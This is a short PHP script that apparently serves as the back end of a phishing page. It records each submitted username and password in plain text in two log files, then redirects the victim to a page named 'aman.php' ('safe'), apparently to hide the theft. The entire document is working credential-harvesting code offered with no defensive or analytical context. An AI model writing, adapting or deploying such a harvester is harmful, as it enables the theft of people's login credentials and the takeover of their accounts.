<?php
file_put_contents("semuahasil.txt", "USERNAME/ID: " . $_POST['username'] . " PASSWORD: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents("hasil.txt", "USERNAME/ID: " . $_POST['username'] . " PASSWORD: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: /aman.php');
exit();
